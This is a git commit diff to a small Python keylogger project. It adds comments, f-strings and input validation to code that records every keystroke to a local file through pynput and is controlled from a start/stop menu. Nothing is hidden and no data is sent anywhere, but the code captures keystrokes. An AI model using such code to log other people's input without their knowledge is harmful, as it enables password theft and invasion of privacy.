05af1adefa0b28013e4c6378f0e6320c7dee6a60
Amogha-Upadyaya <amoghaupadyaya.official@gmail.com>
2024-06-20 12:42:32 +0530

    Added comments and modified code

--- KeyLogger.py
+++ KeyLogger.py
@@ -4,7 +4,19 @@ import logging
 
 class KeyLogger:
     def __init__(self, log_file='key_log.txt'):
+        """
+        Initialize the Keylogger with a log file.
+
+        Parameters:
+            log_file (str): The file where keystrokes will be logged.
+        """
+
         self.log_file = log_file
+        self._setup_logging()
+        self.listener = None
+
+    def _setup_logging(self):
+        # Configure the logging settings
         logging.basicConfig(
             filename = self.log_file,
             level = logging.DEBUG,
@@ -14,20 +26,35 @@ class KeyLogger:
         self.listener = None
 
     def on_press(self, key):
+        """
+        Callback function to be called when a key is pressed.
+
+        Parameters:
+            key (pynput.keyboard.Key or pynput.keyboard.KeyCode): The key that was pressed
+        """
         try:
-            logging.info('Key {0} pressed'.format(key.char))
+            logging.info(f'Key {key.char} pressed')
         except AttributeError:
-            logging.info('Special key {0} pressed'.format(key))
+            logging.info(f'Special key {key} pressed')
     
     def on_release(self, key):
+        """
+        Callback function to be called when a ket is released.
+
+        Parameters:
+            key (pynput.keyboard.Key or pynput.keyboard.KeyCode): They key that was released
+        """
         if key == Key.esc:
+            # Stop listener if the escape key is released.
             return False
     
     def start(self):
+        # Start the keylogging listener
         self.listener = Listener(on_press = self.on_press, on_release = self.on_release)
         self.listener.start()
     
     def stop(self):
+        # Stop the keylogging listener if it is running
         if self.listener is not None:
             self.listener.stop()
             self.listener = None
--- main.py
+++ main.py
@@ -6,9 +6,16 @@ def main():
     while True:
         print("\nKEYLOGGER CONTROL MENU:\n1. Start Keylogger\n2. Stop Keylogger\n3 Exit")
 
-        opt = int(input("Enter your choice (1-3): "))
+        try:
+            # Get user input and convert it to an integer
+            opt = int(input("Enter your choice (1-3): ")) 
+        except ValueError:
+            print("\nInvalide Input. Please enter a number between 1 and 3.")
+            time.sleep(1)
+            continue
         
         if opt == 1:
+            # Start the keylogger if it is not already running
             if keylogger.listener is None or not keylogger.listener.running:
                 keylogger.start()
                 print("\nKeylogger Started")
@@ -16,6 +23,7 @@ def main():
                 print("\nKeylogger is already running")
         
         elif opt == 2:
+            # Stop the keylogger if it is running
             if keylogger.listener is not None and keylogger.listener.running:
                 keylogger.stop()
                 print("\nKeylogger stopped")
@@ -23,6 +31,7 @@ def main():
                 print("\nKeylogger is not running")
         
         elif opt == 3:
+            # Exit the program
             if keylogger.listener is not None and keylogger.listener.running:
                 keylogger.stop()
             print("\nExiting...")
